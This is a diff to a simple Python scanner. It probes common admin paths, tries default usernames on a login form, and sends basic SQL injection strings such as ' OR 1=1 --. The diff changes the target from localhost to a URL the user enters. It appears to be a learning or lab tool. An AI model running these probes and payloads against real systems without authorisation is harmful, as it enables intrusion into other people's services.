@@ -1,31 +1,60 @@
 import requests
 
-base_url = "http://127.0.0.1:5000"
+base_url = input("Enter target URL: ")
 
-print("Scanning for vulnerabilities...\n")
+print("\n[INFO] Scanning started...\n")
 
-# 🔍 1. Check hidden endpoints
-common_paths = ["admin", "login", "dashboard", "secret"]
+results = []
 
-for path in common_paths:
-    url = f"{base_url}/{path}"
-    response = requests.get(url)
+# 🔍 Directory check
+def scan_directories():
+    paths = ["admin", "login", "dashboard", "secret"]
 
-    if response.status_code == 200:
-        print(f"[FOUND] {url} → {response.status_code}")
+    for path in paths:
+        url = f"{base_url}/{path}"
+        response = requests.get(url)
 
-# 🔐 2. Test login bypass
-login_url = f"{base_url}/login"
+        if response.status_code == 200:
+            result = f"[FOUND] {url}"
+            print(result)
+            results.append(result)
 
-payloads = ["admin", "admin123", "testadmin", "user"]
+# 🔐 Auth bypass test
+def test_auth_bypass():
+    url = f"{base_url}/login"
+    payloads = ["admin", "admin123", "testadmin"]
 
-for payload in payloads:
-    data = {
-        "username": payload,
-        "password": "anything"
-    }
+    for payload in payloads:
+        data = {"username": payload, "password": "test"}
+        response = requests.post(url, data=data)
 
-    response = requests.post(login_url, data=data)
+        if "Welcome admin" in response.text:
+            result = f"[VULNERABLE] Auth bypass → {payload}"
+            print(result)
+            results.append(result)
 
-    if "Welcome admin" in response.text:
-        print(f"[VULNERABLE] Login bypass with username: {payload}")
+# 💉 SQL Injection test
+def test_sql_injection():
+    url = f"{base_url}/login2"
+    payloads = ["' OR '1'='1", "' OR 1=1 --"]
+
+    for payload in payloads:
+        data = {"username": payload, "password": "test"}
+        response = requests.post(url, data=data)
+
+        if "Logged in" in response.text:
+            result = f"[SQL VULNERABLE] Payload → {payload}"
+            print(result)
+            results.append(result)
+
+# Run all
+scan_directories()
+test_auth_bypass()
+test_sql_injection()
+
+# Save results
+with open("vuln_results.txt", "w", encoding="utf-8") as f:
+    for r in results:
+        f.write(r + "\n")
+
+print("\n[INFO] Scan completed. Results saved.")
